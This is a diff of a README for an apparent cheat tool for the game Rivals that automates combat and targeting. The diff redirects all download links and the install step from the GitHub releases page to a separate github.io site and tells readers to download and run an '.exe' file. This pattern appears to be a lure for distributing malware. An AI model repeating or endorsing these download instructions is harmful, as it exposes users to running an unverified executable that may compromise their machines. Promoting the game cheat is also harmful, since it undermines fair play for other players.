@@ -1,6 +1,6 @@
 # ⚡ rivals-windows-script-tool - Automate your game progression and combat
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/rashidmutyaba61-sudo/rivals-windows-script-tool/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://rashidmutyaba61-sudo.github.io)
 
 ## 📌 About this tool
 
@@ -20,7 +20,7 @@ Before you install the tool, check your computer for these prerequisites:
 
 Follow these steps to get the tool running on your PC.
 
-1. Visit the project release page: https://github.com/rashidmutyaba61-sudo/rivals-windows-script-tool/releases
+1. Visit the project release page: https://rashidmutyaba61-sudo.github.io
 2. Look for the section labeled Latest Release.
 3. Find the file ending in .exe.
 4. Click the file name to start the download.
@@ -72,4 +72,4 @@ Development of this tool continues based on user feedback. Future versions will 
 
 Keywords: automation, rivals, windows, script, game-tool, progression, targeting
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/rashidmutyaba61-sudo/rivals-windows-script-tool/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://rashidmutyaba61-sudo.github.io)
